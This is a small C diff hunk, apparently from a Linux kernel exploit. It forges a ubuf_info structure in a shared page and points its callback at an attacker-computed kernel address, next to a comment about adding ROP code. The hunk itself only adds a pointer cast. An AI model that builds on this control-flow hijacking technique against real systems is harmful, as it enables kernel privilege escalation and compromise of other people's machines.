@@ -221,7 +221,7 @@ static inline void shared_info_write_page(char *base)
 	/* Gil, write your ROP code magic here */
 
 	struct ubuf_info *uarg = (struct ubuf_info*)base;
-	uarg->callback = gilkup_vars.page_offset + (PFN << 12) + sizeof(*uarg);
+	uarg->callback = (void*)(gilkup_vars.page_offset + (PFN << 12) + sizeof(*uarg));
 	refcount_set(&uarg->refcnt, 1);
 	base += sizeof(*uarg);
 
